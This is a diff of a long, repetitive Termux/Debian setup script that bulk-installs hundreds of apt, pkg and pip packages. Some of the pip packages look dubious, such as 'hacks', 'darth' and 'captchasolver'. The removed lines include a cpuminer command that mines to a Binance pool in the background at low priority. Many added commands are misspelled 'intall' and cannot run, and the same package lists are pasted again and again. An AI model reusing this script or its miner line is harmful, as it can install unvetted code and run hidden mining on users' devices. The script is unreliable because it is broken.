@@ -1,42 +1,604 @@
  apt update 
 apt upgrade -y 
 
-apt install -y python3-matplotlib python3-pip python3-full build-essential automake autoconf nano pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev make g++ z3 ntp sntp yasm flex git gcc bash bat bats cmake python3-twisted python3-wheel tar automake gzip wget curl python3-z3 nsca node-sntp tcllib suck trn4 radioclk libnet-ntp-perl leafnode php-net-nntp raintpl jython 
+pkg intall -y kf6-kcompletion
 
-python3 -m pip install pychroot zzip importlib-resources z4-solver captchasolver py.proxy blockchain z4 binance pool worker click librosa blockchain-etl binance-connector
- 
- apt install -y aspnetcore-runtime-6.0 aspnetcore-runtime-7.0 dotnet-apphost-pack-6.0 
+pkg intall -y kf6-kconfigwidgets
 
-apt install -y dotnet-apphost-pack-7.0 dotnet-apphost-pack-8.0 
+pkg intall -y kf6-ki18n
 
-apt install -y dotnet-host
+pkg intall -y kf6-kjobwidgets
 
-apt install -y dotnet-host-7.0 
+pkg intall -y kf6-ktextwidgets
 
-apt install -y dotnet-host-8.0 dotnet-hostfxr-6.0 dotnet-hostfxr-7.0 
+pkg intall -y kf6-kwidgetsaddons
 
-apt install -y dotnet-hostfxr-8.0 dotnet-runtime-6.0 dotnet-runtime-7.0 dotnet-runtime-8.0 
+pkg intall -y kf6-purpose
 
-apt install -y dotnet-sdk-6.0 dotnet-sdk-6.0-source-built-artifacts dotnet-sdk-7.0 dotnet-sdk-7.0-source-built-artifacts
+pkg intall -y libcwidget
 
-apt install -y dotnet-sdk-8.0 dotnet-sdk-8.0-source-built-artifacts dotnet-targeting-pack-6.0 dotnet-targeting-pack-7.0 
+pkg intall -y libcwidget-static
 
-apt install -y dotnet-targeting-pack-8.0 dotnet-templates-6.0 dotnet-templates-7.0 
+pkg intall -y libfinalcut
 
+pkg intall -y libgedit-gtksourceview
 
-apt install -y dotnet-templates-8.0 dotnet6 dotnet7 dotnet8 libgtk-dotnet3.0-cil libgtk-dotnet3.0-cil-dev libgtk2.0-cil libgtk2.0-cil-dev 
+pkg intall -y libnewt
 
-apt install -y duck bettercap wmbubble python3-box readucks gkrellm-bfm golang-github-wildducktheories-go-csv-dev garagemq zydis-tools ruby-ethon libjsmn-dev libmatthew-java-doc libnss-tls
- 
- 
- ./cpuminer --algo=sha256d --threads=1 --cpu-priority=0 --cpu-affiniy=0x0010000000001000 --api-bind=127.0.0.1:38364::38390 --url=stratum+tcp://sha256.poolbinance.com:443 --user=dolBlob01.001 -p 123456 --background
+pkg intall -y libt3widget
 
+pkg intall -y libxaw
 
+pkg intall -y libxfce4ui
 
+pkg intall -y motif
 
+pkg intall -y nzbget
+
+pkg intall -y qcustomplot
+
+pkg intall -y qtermwidget
+
+pkg intall -y qtutilities
+
+pkg intall -y rust-std-aarch64-linux-android
+
+pkg intall -y rust-std-armv7-linux-androideabi
+
+pkg intall -y rust-std-i686-linux-android
+
+pkg intall -y rust-std-wasm32-unknown-unknown
+
+pkg intall -y rust-std-wasm32-wasi
+
+pkg intall -y rust-std-wasm32-wasip1
+
+pkg intall -y rust-std-wasm32-wasip2
+
+pkg intall -y rust-std-x86-64-linux-android
+pkg intall -y teleport-
+apt update && apt upgrade && apt update && apt install -y aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static valgrind valgrind-static asciidoc gbt geth go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks && apt remove nano && termux-setup-storage && termux-reload-settings
+
+apt install -y termux-am termux-am-socket termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools
+
+apt install -y autoconf resolv-conf automake php prover9 z3 dcmtk git-gitk pdftk pypy-tkinter pypy3-tkinter python-tkinter tk git proot wget curl zziplib assimp osm2pgsql mg vile gap
+
+apt install -y flex yasm 
+
+apt install -y gcal libgc libgc-static libgcrypt libgcrypt-static libsigc++-2.0 libsigc++-3.0 pngcrush
+
+apt install -y flex-static libfcl liblog4c libphysfs libpipeline libsoldout yasm-static
+
+apt install -y ctags esbuild fossil gbt glib gn gradle hz ldc
+
+apt install -y libresolv-wrapper libunbound resolv-conf
+
+apt install -y libarchive libarchive-static libchipmunk libhdf5 libopencc libtalloc libuber-h3 libunbound libyaml-cpp libzip lua-lpeg macchina marisa memcached muchsync ncompress netcdf-c mbedtls mc 
+
+apt install -y miniserve monolith moreutils zile cgdb
+
+apt install -y mruby msmtp mupdf mupdf-tools mympd n2n ncdc nginx ngircd oathtool oathtool-static openethereum pass
+
+apt install -y pcal proxychains-ng pup python-greenlet python-grpcio python-libsass python-lxml restish serd serf shell2http shellharden shtool signify slashtime
+
+apt install -y libforestdb libfreexl libftxui libgcrypt libgf2x libglvnd libgnt libgpg-error
+
+apt install -y libgrpc libgts libhdf5 libhiredis libhtmlcxx libical libicu libimagequant libjansi
+
+apt install -y libliquid-dsp libmad libmcrypt libmdbx libmesode
+
+apt install -y libmhash libmicrohttpd libmnl libmp3lame libncnn libnova liboggz
+
+apt install -y libopencc libosl libotr libplist libpoco libpolly libprotozero libraqm
+
+apt install -y aha ansifilter console-bridge dasel docbook-xml docbook-xsl enscript g-ir-scanner
+
+apt install -y gumbo-parser html-xml-utils html2text imlib2
+
+apt install -y imlib2-static libebml libexpat libhtmlcxx libhtmlcxx-static
+
+apt install -y id3lib imlib2 ipcalc iperf3 json-glib
+
+apt install -y at-spi2-core cfengine codecrypt console-bridge golang-doc heyu libnewt libolm libtreesitter
+
+apt install -y libdvbcsa libdvbpsi libvbisam tvheadend vbindiff ocl-icd octave opencl-clhpp opencl-headers opencl-vendor-driver openethereum outfieldr pastebinit peaclock
+
+apt install -y cfengine
+apt install -y cfengine-static
+apt install -y cfm
+apt install -y go-musicfox
+
+apt install -y libfcft
+apt install -y libxcfun
+apt install -y mcfly
+apt install -y ncftp
+apt install -y openfoam
+
+apt install -y recutils
+apt install -y gbt
+apt install -y hstr
+apt install -y zsh
+apt install -y zsh-completions
+
+apt install -y  brook fact++ fastmod fdupes freeimage libandroid-wordexp libbullet libccd libdav1d
+
+apt install -y nsis ocl-icd odt2txt okc-agents oorexx open-adventure openal-soft openbabel opencc-tools
+
+apt install -y opencl-clhpp
+
+apt install -y opencl-headers
+
+apt install -y opencl-vendor-driver opencolorio
+
+apt install -y opencv opencv-python openethereum
+
+apt install -y openethereum-utils openexr openfoam opengl openjdk-17 
+
+apt install -y openjdk-17-source
+
+apt install -y openjdk-17-x openjpeg openjpeg-tools openldap
+
+apt install -y openldap-static openmpi 
+
+apt install -y openmpi-static openscad openssh 
+
+apt install -y openssh-sftp-server openssl
+
+apt install -y openssl-1.1
+
+apt install -y openssl-1.1-static 
+
+apt install -y openssl-static
+
+apt install -y openssl-tool openssl1.1-tool
+
+apt install -y b3sum binutils binutils-bin binutils-cross 
+
+apt install -y binutils-gold binutils-is-llvm binutils-libs blk-utils 
+
+apt install -y coreutils dateutils debianutils
+
+apt install -y diffutils dmtx-utils dnsutils dnsutils-static dwarves
+
+apt install -y elfutils findutils fontconfig-utils geth-utils giflib-utils
+
+apt install -y harfbuzz-utils hfsutils html-xml-utils icoutils
+
+apt install -y inetutils knot-utils libbluray-utils libcoinor-utils
+
+apt install -y libcoinor-utils-static libjasper-utils
+
+apt install -y librinutils libtiff-utils libxml2-utils littlecms-utils
+
+apt install -y mailutils mailutils-static moreutils mount-utils 
+
+apt install -y mtd-utils ncurses-utils nss-utils openethereum-utils 
+
+apt install -y qemu-utils recutils recutils-static renameutils 
+
+apt install -y sensible-utils sharutils speex-utils uuid-utils vtutils xz-utils
+
+apt install -y adms iverilog iverilog-static gpgv minisign par2 rhash signify vera ca-certificates ca-certificates-java libandroid-stub libksba aapt aapt2 abootimg aidl android-tools apksigner d8 dex2jar libandroid-complex-math libandroid-complex-math-static libandroid-utimes-static tergent termux-am termux-elf-cleaner tvheadend vulkan-loader-android
+
+apt install -y libzen libzen-static libzim libzimg
+
+apt install -y libzimg-static libzip libzita-convolver libzix libzmq 
+
+apt install -y libzmq-static libzopfli
+
+apt install -y libzxing-cpp
+
+apt install -y mediainfo mlir morse2ascii mutt
+
+apt install -y myman navidrome ndk-multilib-native-static
+
+apt install -y ndk-multilib-native-stubs ndk-sysroot
+
+apt install -y nmap-ncat odt2txt oh-my-posh sse2neon lsd
+
+apt install -y aalib apr apr-util base16384 bitcoin boost brook busybox cuetools db dnstop dx fdisk fossil gdbm geoip2-database gkermit glulxe gobang guile18 influxdb kcptun libass libatomic-ops libdb libduckdb libduktape libfdisk libffi libhiredis libimagequant libkokkos liblightning liblzo libmaxminddb libmdbx libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm locustdb microsocks miller monetdb natpmpc ngircd osm2pgsql patchelf pcaudiolib pforth phpmyadmin portaudio postgis postgresql python-bcrypt ragel recutils redis sfeed shtool sqlcipher ssdb unicode-data upx usql utf8cpp uthash yq tk 
+
+apt install -y capstone-static
+
+apt install -y boost-static
+
+apt install -y bison-static
+
+apt install -y antibody atuin autoconf autoconf213 b3sum bash bash-completion beanshell cicada clifm command-not-found coreutils csh cuetools dialog direnv docbook-xsl duckdb eltclsh elvish et etsh fish gdrive-downloader gum hilbish hstr jo jump libcue libfreexl libgts mcfly mdns-scan mksh mosh mypaint-brushes n-t-roff-sc navi nushell oh-my-posh oleo openssh parallel rcshell sc-im sfeed sharutils shc sheldon shell2http shellcheck shellharden shellinabox shfmt shtool spark sqlite ssdeep starship surfraw tasksh tcsh termux-exec translate-shell unpaper wgetpaste which whiptail zsh zssh
+
+apt install -y proot-distro
+
+apt install -y termux-gui-pm
+
+apt install -y gengetopt
+
+apt install -y getconf
+
+apt install -y geth
+
+apt install -y geth-utils
+
+apt install -y gettext
+
+apt install -y gettext-static
+
+apt install -y nzbget
+
+apt install -y rust-std-aarch64-linux-android
+
+apt install -y rust-std-armv7-linux-androideabi
+
+apt install -y wget
+
+apt install -y wget2
+
+apt install -y wget2-static
+
+apt install -y wgetpaste
+
+apt install -y calcurse
+
+apt install -y gauche
+
+apt install -y guile
+
+apt install -y libpano13
+
+apt install -y lhasa
+
+apt install -y libarchive
+
+apt install -y libblosc
+
+apt install -y libbz2
+
+apt install -y libdeflate
+
+apt install -y liblz4
+
+apt install -y liblzma
+
+apt install -y liblzo
+
+apt install -y librsync
+
+apt install -y libsnappy
+
+apt install -y libvorbis
+
+apt install -y libwavpack
+
+apt install -y libzopfli
+
+apt install -y lrzip
+
+apt install -y lz4
+
+apt install -y lzip
+
+apt install -y lzlib
+
+apt install -y lzop
+
+apt install -y ldns-static
+
+apt install -y libknot
+
+apt install -y libresolv-wrapper
+
+apt install -y libunbound
+
+apt install -y pueue 
+
+apt install -y libical 
+
+apt install -y dcmtk
+
+apt install -y transmission
+
+apt install -y uftrace
+
+apt install -y unar
+
+apt install -y urdfdom
+
+apt install -y uthash
+
+apt install -y uucp
+
+apt install -y uwsgi
+
+apt install -y libopencc 
+
+apt install -y libosl 
+
+apt install -y libotr 
+
+apt install -y libplist 
+
+apt install -y libpoco 
+
+apt install -y libpolly 
+
+apt install -y libprotozero 
+
+apt install -y libraqm
+
+apt install -y aha 
+
+apt install -y ansifilter 
+
+apt install -y console-bridge 
+
+apt install -y dasel 
+
+apt install -y docbook-xml 
+
+apt install -y docbook-xsl 
+
+apt install -y enscript 
+
+apt install -y g-ir-scanner
+
+apt install -y gumbo-parser 
+
+apt install -y html-xml-utils 
+
+apt install -y html2text 
+
+apt install -y imlib2
+
+apt install -y imlib2-static 
+
+apt install -y libebml 
+
+apt install -y libexpat 
+
+apt install -y libhtmlcxx 
+
+apt install -y libhtmlcxx-static
+
+apt install -y id3lib 
+
+apt install -y imlib2 
+
+apt install -y ipcalc 
+
+apt install -y iperf3 
+
+apt install -y json-glib
+
+apt install -y at-spi2-core 
+
+apt install -y cfengine 
+
+apt install -y codecrypt 
+
+apt install -y console-bridge 
+
+apt install -y golang-doc 
+
+apt install -y heyu 
+
+apt install -y libnewt 
+
+apt install -y libolm 
+
+apt install -y libtreesitter
 
 pkg in build-essential
+apt install -y termux-am termux-am-socket termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools
+apt install -y autoconf resolv-conf automake php prover9 z3 dcmtk git-gitk pdftk pypy-tkinter pypy3-tkinter python-tkinter tk git proot wget curl zziplib assimp osm2pgsql mg vile gap
+apt install -y flex yasm 
+apt install -y gcal libgc libgc-static libgcrypt libgcrypt-static libsigc++-2.0 libsigc++-3.0 pngcrush
+apt install -y flex-static libfcl liblog4c libphysfs libpipeline libsoldout yasm-static
+apt install -y ctags esbuild fossil gbt glib gn gradle hz ldc
+apt install -y libresolv-wrapper libunbound resolv-conf
+apt install -y libarchive libarchive-static libchipmunk libhdf5 libopencc libtalloc libuber-h3 libunbound libyaml-cpp libzip lua-lpeg macchina marisa memcached muchsync ncompress netcdf-c mbedtls mc 
+apt install -y miniserve monolith moreutils zile cgdb
+apt install -y mruby msmtp mupdf mupdf-tools mympd n2n ncdc nginx ngircd oathtool oathtool-static openethereum pass
+apt install -y pcal proxychains-ng pup python-greenlet python-grpcio python-libsass python-lxml restish serd serf shell2http shellharden shtool signify slashtime
+apt install -y libforestdb libfreexl libftxui libgcrypt libgf2x libglvnd libgnt libgpg-error
+apt install -y libgrpc libgts libhdf5 libhiredis libhtmlcxx libical libicu libimagequant libjansi
+apt install -y libliquid-dsp libmad libmcrypt libmesode
+apt install -y libmhash libmicrohttpd libmnl libmp3lame libncnn libnova liboggz
+apt install -y libopencc libosl libotr libplist libpoco libpolly libprotozero libraqm
+apt install -y aha ansifilter console-bridge dasel docbook-xml docbook-xsl enscript g-ir-scanner
+apt install -y gumbo-parser html-xml-utils html2text imlib2
+apt install -y imlib2-static libebml libexpat libhtmlcxx libhtmlcxx-static
+apt install -y id3lib imlib2 ipcalc iperf3 json-glib
+apt install -y at-spi2-core cfengine codecrypt console-bridge golang-doc heyu libnewt libolm libtreesitter
+apt install -y libdvbcsa libdvbpsi libvbisam tvheadend vbindiff ocl-icd octave opencl-clhpp opencl-headers opencl-vendor-driver openethereum outfieldr pastebinit peaclock
+apt upgrade -y
+apt install -y cfengine
+apt install -y cfengine-static
+apt install -y cfm
+apt install -y go-musicfox
 
+apt install -y libfcft
+apt install -y libxcfun
+apt install -y mcfly
+apt install -y ncftp
+apt install -y openfoam
+
+apt install -y recutils
+apt install -y gbt
+apt install -y hstr
+apt install -y zsh
+apt install -y zsh-completions
+apt install -y  brook fact++ fastmod fdupes freeimage libandroid-wordexp libbullet libccd libdav1d
+apt install -y nsis ocl-icd odt2txt okc-agents oorexx open-adventure openal-soft openbabel opencc-tools
+apt install -y opencl-clhpp
+apt install -y opencl-headers
+apt install -y opencl-vendor-driver opencolorio
+apt install -y opencv opencv-python openethereum
+apt install -y openethereum-utils openexr openfoam opengl openjdk-17 
+apt install -y openjdk-17-source
+apt install -y openjdk-17-x openjpeg openjpeg-tools openldap
+apt install -y openldap-static openmpi 
+apt install -y openmpi-static openscad openssh 
+apt install -y openssh-sftp-server openssl
+apt install -y openssl-1.1
+apt install -y openssl-1.1-static 
+apt install -y openssl-static
+apt install -y openssl-tool openssl1.1-tool
+apt install aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo cfengine-static cfm go-musicfox termux-am termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools acr autoconf resolv-conf rcs bat make cmake automake yasm flex figlet toilet ruby cowsay mpv ffmpeg clamav virustotal-cli agate autoconf-archive autoconf213 avra bastet bc blk-utils bore buf c-toxcore catdoc chrony cmocka cointop cppi croc cuetools curseofwar dasm distant djvulibre dnslookup docbook-xml faust fdm finch frotz frp fwknop gawk gegl geoip2-database geth gflags glib gmic gmic-gm golang-doc gpac graphicsmagick html2text htop imgflo ipfs jq keybase knockd leptonica libandroid-support libassuan libblkid libblocksruntime libblosc libcoap libcroco libcroco-static libdav1d libduckdb libduktape libgxps libical libliquid-dsp liblo libnl libpipeline libpoco libpolly librav1e librocksdb librocksdb-static libsignal-protocol-c libsoundtouch libspectre libspice-protocol libspice-server libsrt libssh2 libtalloc libtalloc-static libtbb libtermkey libtorrent-rasterbar libuv libvips libwayland libwayland-protocols libwslay libxml2 libxslt libzmq libzxing-cpp locustdb lsof luarocks m4 man mdns-scan microsocks mlocate mosh ncftp neocmakelsp neovim net-snmp ninja ocl-icd ocrad ocrad-static octave octave-static octomap octomap-static odt2txt osmctools pandoc pdfcpu pdftk peaclock photon-rss php-fpm picocom pipebuffer plutolang pocketbase procps procps-static procs procyon-decompiler proxychains-ng psmisc pup python-greenlet python-torchaudio rav1e ravencoin rdiff-backup rip ripgrep-all rtmpdump ruby-ri rust rust-docs scdoc shntool simulavr socat softether-vpn spiped srelay stunnel tesseract texinfo texlab tokei torsocks torsocks-static tree-sitter-vimdoc tree-sitter-vimdoc-static tsocks tty-clock ttyc unpaper utf8proc utf8proc-static uthash valadoc valadoc-static vobsub2srt websocat wireproxy wordgrinder xcb-proto xorgproto xsltproc yq blackbox discordo kcptun libnss libotr libseccomp libseccomp-static wasmer wireguard-tools xmlsec xmlsec-static yarn zssh libmaxminddb libmdbx libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob monetdb libdb google-drive-upload google-glog googletest translate-shell aapt aapt2
+apt install -y game-repo science-repo aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static asciidoc gbt geth go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
+apt install -y ffsend finch geckodriver geographiclib 
+apt install -y glab-cli glow gomp gomuks hcloud hummin 
+apt install -y hut ices inxi irssi jack-example-tools jfrog-cli jftui jira-go jql k9s 
+apt install -y kakoune-lsp kubectl lastpass-cli lftp libc-client libc-client-static libcurl libhiredis libice 
+apt install -y libmesode libmpdclient libnats-c 
+apt install -y libneon libnfs libnl-cli 
+apt install -y libnl-cli-static libshout 
+apt install -y libsoup libsoup3 libssh2 libtd libusbmuxd libx11 libxcb libxrender 
+apt install -y lux mangal markdown-flashcards matterircd minidlna miniupnpc 
+apt install -y monolith mosquitto mpdscribble msmtp mu mutt mympd ncdc ncmpcpp 
+apt install -y ncspot octave openethereum 
+apt install -y pastebinit pianobar pounce profanity python-pynvim q-dns-client 
+apt install -y railway-cli rbw rdircd restish rirc rtorrent sd seafile-client 
+apt install -y seafile-client-static senpai serf snapcast-client snapcast-server 
+apt install -y snowflake-client sssnake step-cli storj-uplink sun tea
+apt install -y telegram-cli tintin++ tinyfugue tizonia toxic transmission trzsz-ssh ttyc virustotal-cli 
+apt install -y wakatime-cli waypipe websocat weechat whois wireproxy ytui-music 
+apt install -y liblqr libnewt libpoco libsamplerate libstemmer 
+apt install -y libtreesitter libxcvt
+apt install -y llvm-mingw-w64 
+apt install -y llvm-mingw-w64-libcompiler-rt 
+apt install -y llvm-mingw-w64-tools
+apt install -y llvm-mingw-w64-ucrt blackbox box2d boxedwine 
+apt install -y boxes bubblewrap busybox dosbox 
+apt install -y dosbox-x
+apt install -y dosbox-x-data feed2imap-go 
+apt install -y fluxbox hstr isync mailsync matchbox-keyboard 
+apt install -y obconf 
+apt install -y obconf-qt 
+apt install -y openbabel 
+apt install -y openbox 
+apt install -y openbox-static rhythmbox rhythmbox-help shellinabox sing-box squeezelite the-powder-toy whiptail whitebox-tools xfce4-mailwatch-plugin 
+pip install lolcat
+pip install autoclick
+apt install -y python-scipy
+apt install -y python-numpy-static
+apt install -y netsurf
+apt install -y tsu
+apt install -y curl 
+apt install -y curlie 
+apt install -y libcurl 
+apt install -y libcurl-static 
+apt install -y websocat
+apt intall -y bluefish
+apt intall -y cuse
+apt intall -y dialog
+apt intall -y eww
+apt intall -y gengetopt
+apt intall -y getconf
+apt intall -y geth
+apt intall -y geth-utils
+apt intall -y gettext
+apt intall -y gettext-static
+apt intall -y kf6-kcompletion
+apt intall -y kf6-kconfigwidgets
+apt intall -y kf6-ki18n
+apt intall -y kf6-kjobwidgets
+apt intall -y kf6-ktextwidgets
+apt intall -y kf6-kwidgetsaddons
+apt intall -y kf6-purpose
+apt intall -y libcwidget
+apt intall -y libcwidget-static
+apt intall -y libfinalcut
+apt intall -y libgedit-gtksourceview
+apt intall -y libnewt
+apt intall -y libt3widget
+apt intall -y libxaw
+apt intall -y libxfce4ui
+apt intall -y motif
+apt intall -y nzbget
+apt intall -y qcustomplot
+apt intall -y qtermwidget
+apt intall -y qtutilities
+apt intall -y rust-std-aarch64-linux-android
+apt intall -y rust-std-armv7-linux-androideabi
+apt intall -y rust-std-i686-linux-android
+apt intall -y rust-std-wasm32-unknown-unknown
+apt intall -y rust-std-wasm32-wasi
+apt intall -y rust-std-wasm32-wasip1
+apt intall -y rust-std-wasm32-wasip2
+apt intall -y rust-std-x86-64-linux-android
+apt intall -y teleport-tsh 
+apt intall -y uget 
+apt intall -y vegeta 
+apt intall -y wget 
+apt intall -y wget2
+apt intall -y wget2-static 
+apt intall -y wgetpaste 
+apt intall -y wxwidgets 
+apt intall -y xsel
+apt intall -y ethtool
+apt intall -y freeimage
+apt intall -y frida
+apt intall -y frida-dev
+apt intall -y gauche
+apt intall -y gecode
+apt intall -y glfw
+apt intall -y hz
+apt intall -y i2c-tools
+apt intall -y icu-devtools
+apt intall -y ipmitool
+apt intall -y iw
+apt intall -y kf6-purpose
+apt intall -y ladspa-sdk
+apt intall -y libblkid
+apt intall -y libccid
+apt intall -y libcdk
+apt intall -y libcoap
+apt intall -y libcryptsetup
+apt intall -y libdevil
+apt intall -y libdevmapper
+apt intall -y libevdev
+apt intall -y libevdev-static
+apt intall -y libgedit-tepl
+apt intall -y libimobiledevice
+apt intall -y libimobiledevice-glue
+apt intall -y libimobiledevice-glue-static
+apt intall -y libimobiledevice-static
+apt intall -y libmnl
+apt intall -y libtheora
+apt intall -y libusb
+apt intall -y libusbmuxd
+apt intall -y libusbredir
+apt intall -y libv4l
+apt intall -y libvmaf
+apt intall -y libwolfssl
+apt intall -y lit
+apt intall -y llvm-tools
+apt intall -y lvm2
+apt intall -y mate-common
+apt intall -y miniupnpc
+apt intall -y mtd-utils
+apt intall -y mtdev-static
+apt intall -y openjdk-17
+apt intall -y openjdk-21
+apt intall -y panda3d
+apt intall -y pciutils
+apt intall -y python-cryptography
+apt intall -y qt-creator
+apt intall -y qt5-qttools
+apt intall -y qt6-qttools
+apt intall -y rgbds
+apt intall -y rustc-dev
+apt intall -y scrcpy
+apt intall -y scrub
+apt intall -y teleport-tsh
+apt intall -y termux-x11-nightly
+apt intall -y usbmuxd
+apt intall -y v4l-utils
+apt intall -y wavemon
+apt intall -y xfce4-dev-tools
+apt intall -y z-push
+pip install pyopenssl telethon requests captcha-solver
+pip install pychroot --no-deps
+pip install librosa --no-deps
 apt install -y termux-am termux-am-socket termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools
 
 apt install -y autoconf resolv-conf automake php prover9 z3 dcmtk git-gitk pdftk pypy-tkinter pypy3-tkinter python-tkinter tk git proot wget curl zziplib assimp osm2pgsql mg vile gap
@@ -77,7 +639,7 @@ apt install -y imlib2-static libebml libexpat libhtmlcxx libhtmlcxx-static
 
 apt install -y id3lib imlib2 ipcalc iperf3 json-glib
 
-apt install -y at-spi2-core cfengine codecrypt console-bridge golang-doc heyu libgnutls libnewt libolm libtreesitter
+apt install -y at-spi2-core cfengine codecrypt console-bridge golang-doc heyu libnewt libolm libtreesitter
 
 apt install -y libdvbcsa libdvbpsi libvbisam tvheadend vbindiff ocl-icd octave opencl-clhpp opencl-headers opencl-vendor-driver openethereum outfieldr pastebinit peaclock
 
@@ -85,18 +647,7 @@ apt install -y google-drive-upload
 apt install -y google-glog
 apt install -y googletest
 apt install -y translate-shell
-apt install -y aapt
-apt install -y aapt2
-
-apt install -y apt
-apt install -y dpkg
-apt install -y dpkg-perl
-apt install -y dpkg-scanpackages
 apt install -y libapt-pkg-perl
-apt install -y pkg-config
-
-apt install -y pkgfile
-apt install -y pkgtop
 
 apt install -y cfengine
 apt install -y cfengine-static
@@ -157,8 +708,8 @@ pkg upgrade -y
 pkg in build-essential
 apt install -y samba libcairomm-1.0 libcap libidn2 libisofs libjasper libjasper-utils libksba libnghttp2 libsigc++-2.0 libsigc++-3.0 libtpms libtvision libzmq openjpeg openjpeg-tools range-v3 stdman dirb fzf fzy glow harfbuzz harfbuzz-icu harfbuzz-utils lexter pick wuzz zziplib zzuf zzuf-static fatsort fcp libcap libhtmlcxx libice liblua51 libsm libx11 libx11-static libxau libxcb libxdmcp libxext libxfixes libxi libxrandr libxss libxt libzxing-cpp lua51 openjdk-21-x screen tergent x11-repo xorgproto
 pkg upgrade -y
-pkg install aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo dpkg dpkg-perl dpkg-scanpackages libapt-pkg-perl pkg-config pkgfile pkgtop cfengine cfengine-static cfm go-musicfox termux-am termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools acr autoconf resolv-conf rcs bat make cmake automake yasm flex figlet toilet ruby cowsay mpv ffmpeg clamav virustotal-cli agate autoconf-archive autoconf213 avra bastet bc blk-utils bore buf c-toxcore catdoc chrony cmocka cointop cppi croc cuetools curseofwar dasm distant djvulibre dnslookup docbook-xml faust fdm finch frotz frp fwknop gawk gegl geoip2-database geth gflags glib gmic gmic-gm golang-doc gpac graphicsmagick html2text htop imgflo ipfs jq keybase knockd leptonica libandroid-support libassuan libblkid libblocksruntime libblosc libcoap libcroco libcroco-static libdav1d libduckdb libduktape libgnutls libgxps libical libliquid-dsp liblo libnl libpipeline libpoco libpolly librav1e librocksdb librocksdb-static libsignal-protocol-c libsoundtouch libspectre libspice-protocol libspice-server libsrt libssh2 libtalloc libtalloc-static libtbb libtermkey libtorrent-rasterbar libuv libvips libwayland libwayland-protocols libwslay libxml2 libxslt libzmq libzxing-cpp locustdb lsof luarocks mlocate mosh ncftp neocmakelsp neovim net-snmp ninja ocl-icd ocrad ocrad-static octave octave-static octomap octomap-static odt2txt osmctools pandoc pdfcpu pdftk peaclock photon-rss php-fpm picocom pipebuffer plutolang pocketbase procps procps-static procs procyon-decompiler proxychains-ng psmisc pup python-greenlet python-torchaudio rav1e ravencoin rdiff-backup rip ripgrep-all rtmpdump ruby-ri rust rust-docs scdoc shntool simulavr socat softether-vpn spiped srelay stunnel tesseract texinfo texlab tokei torsocks torsocks-static tree-sitter-vimdoc tree-sitter-vimdoc-static tsocks tty-clock ttyc unpaper utf8proc utf8proc-static uthash valadoc valadoc-static vobsub2srt websocat wireproxy wordgrinder xcb-proto xorgproto xsltproc yq blackbox discordo kcptun libgnutls libnss libotr libseccomp libseccomp-static wasmer wireguard-tools xmlsec xmlsec-static yarn zssh  libmariadbcpp libmaxminddb libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob monetdb libdb google-drive-upload google-glog googletest translate-shell aapt aapt2
-apt install -y game-repo science-repo aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static asciidoc gbt geth gnugo go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
